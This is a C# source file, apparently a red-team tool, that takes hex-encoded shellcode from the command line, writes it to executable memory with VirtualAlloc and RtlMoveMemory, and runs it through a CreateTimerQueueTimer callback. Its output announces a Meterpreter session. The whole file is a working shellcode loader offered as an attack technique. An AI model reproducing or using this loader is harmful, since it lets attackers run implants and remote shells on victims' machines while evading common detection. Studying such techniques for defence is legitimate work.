using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace NativePayload_CreateTimerQueueTimer
{
    class Program
    {

        [Flags]
        public enum AllocationType
        {
            Commit = 0x00001000,
            Reserve = 0x00002000,
            Decommit = 0x00004000,
            Release = 0x00008000,
            Reset = 0x00080000,
            TopDown = 0x00100000,
            WriteWatch = 0x00200000,
            Physical = 0x00400000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            NoAccess = 0x0001,
            ReadOnly = 0x0002,
            ReadWrite = 0x0004,
            WriteCopy = 0x0008,
            Execute = 0x0010,
            ExecuteRead = 0x0020,
            ExecuteReadWrite = 0x0040,
            ExecuteWriteCopy = 0x0080,
            GuardModifierflag = 0x0100,
            NoCacheModifierflag = 0x0200,
            WriteCombineModifierflag = 0x0400
        }

        [DllImport("kernelbase.dll")]
        public static extern bool CloseHandle(IntPtr hObject);
        [DllImport("ntdll.dll")]
        private static extern bool RtlMoveMemory(IntPtr addr, byte[] pay, uint size);
        //[DllImport("kernel32.dll")]
        //public static extern IntPtr LoadLibraryW([MarshalAs(UnmanagedType.LPWStr)]string lpFileName);
        [DllImport("kernelbase.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateTimerQueue();
        [DllImport("kernel32.dll")]
        private static extern bool CreateTimerQueueTimer(out IntPtr phNewTimer, IntPtr TimerQueue, IntPtr Callback, uint Parameter, uint DueTime, uint Period, ulong Flags);
         /// lpName for "CreateEventA" should be LPCSTR not bool ;) but this code works ...
        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateEventA(IntPtr lpEventAttributes, bool bManualReset, bool bInitialState, bool lpName);
        [DllImport("kernel32.dll")]
        private static extern bool SetEvent(IntPtr hndle);
        [DllImport("kernel32.dll")]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
        static void Main(string[] args)
        {   /// .Net 3.5 / 4.0 only ;)
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("NativePayload_CreateTimerQueueTimer , Published by Damon Mohammadbagher , Mar 2021");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("NativePayload_CreateTimerQueueTimer Callback Functions Technique via (CreateTimerQueueTimer) API");
            Console.WriteLine();
            string[] X = args[0].Split(',');
            byte[] Xpayload = new byte[X.Length];
            for (int i = 0; i < X.Length;) { Xpayload[i] = Convert.ToByte(X[i], 16); i++; }
            Console.WriteLine();
            IntPtr p = VirtualAlloc(IntPtr.Zero, (uint)Xpayload.Length, AllocationType.Commit, MemoryProtection.ExecuteReadWrite);
            //Marshal.Copy(Xpayload, 0, p, Xpayload.Length);
            RtlMoveMemory(p, Xpayload, (uint)Xpayload.Length);
            Console.WriteLine("[!] [" + DateTime.Now.ToString() + "]::VirtualAlloc.Result[" + p.ToString("X8") + "]");
            IntPtr result = CreateTimerQueue();
            Console.WriteLine("[!] [" + DateTime.Now.ToString() + "]::CreateTimerQueue.Result[" + result.ToString("X8") + "]");
            Console.WriteLine();
            System.Threading.Thread.Sleep(5555);
            IntPtr evt = CreateEventA(IntPtr.Zero, true, false, false);
            IntPtr timer = IntPtr.Zero;
            CreateTimerQueueTimer(out timer , result, p, 0, 5000, 0, 0);
            SetEvent(evt);
            Console.WriteLine("Bingo: Meterpreter Session via callback functions Technique by \"CreateTimerQueueTimer\"  ;)");
            WaitForSingleObject(evt, 1000);
            Console.ReadKey();
        }
    }
}
